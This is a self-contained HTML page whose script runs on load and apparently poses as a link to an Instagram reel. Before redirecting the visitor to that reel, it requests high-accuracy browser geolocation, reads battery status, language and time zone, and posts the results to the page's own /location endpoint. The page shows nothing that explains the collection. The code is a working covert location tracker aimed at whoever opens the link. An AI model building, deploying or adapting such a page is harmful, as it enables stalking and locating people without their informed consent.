<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>
<body>
    <main>
        <button id="share-location" type="button"></button>
        <p id="status" role="status" aria-live="polite"></p>
    </main>

    <script>
        const button = document.getElementById("share-location");
        const status = document.getElementById("status");

        async function submitLocation(data) {
            const response = await fetch("/location", {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(data)
            });

            if (!response.ok) {
                throw new Error("Failed to submit location");
            }
        }

        function requestLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({
                        status: "unavailable",
                        errorCode: "API_UNAVAILABLE"
                    });
                    return;
                }

                try {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                status: "granted",
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy
                            });
                        },
                        (error) => {
                            resolve({
                                status: error.code === 1
                                    ? "denied"
                                    : "unavailable",
                                errorCode: error.code === 1
                                    ? "PERMISSION_DENIED"
                                    : error.code === 3
                                        ? "TIMEOUT"
                                        : "POSITION_UNAVAILABLE"
                            });
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 15000,
                            maximumAge: 0
                        }
                    );
                } catch (error) {
                    console.warn("Could not start browser geolocation", error);
                    resolve({
                        status: "unavailable",
                        errorCode: "POSITION_UNAVAILABLE"
                    });
                }
            });
        }

        async function getBatteryStatus() {
            if (typeof navigator.getBattery !== "function") {
                return { status: "unavailable" };
            }

            try {
                const battery = await navigator.getBattery();
                return {
                    status: "available",
                    charging: battery.charging,
                    level: battery.level
                };
            } catch (error) {
                console.warn("Could not read battery status", error);
                return { status: "unavailable" };
            }
        }

        function getBrowserMetadata(battery) {
            let timeZone = "Unavailable";

            try {
                timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone
                    || "Unavailable";
            } catch (error) {
                console.warn("Could not read the browser time zone", error);
            }

            return {
                language: navigator.language || "Unavailable",
                timeZone,
                battery
            };
        }

        async function startTracking() {
            button.hidden = true;

            try {
                const trackResponse = await fetch("/track");

                if (!trackResponse.ok) {
                    throw new Error("Failed to start tracking");
                }

                const [location, battery] = await Promise.all([
                    requestLocation(),
                    getBatteryStatus()
                ]);
                await submitLocation({
                    ...location,
                    ...getBrowserMetadata(battery)
                });
            } catch (error) {
                console.error(error);
            }

            window.location.href = "https://www.instagram.com/reel/DfvSDkNMCTm/?lqvp=a3B0Y3FiMTFraTBn";
        }

        startTracking();
    </script>
</body>
</html>
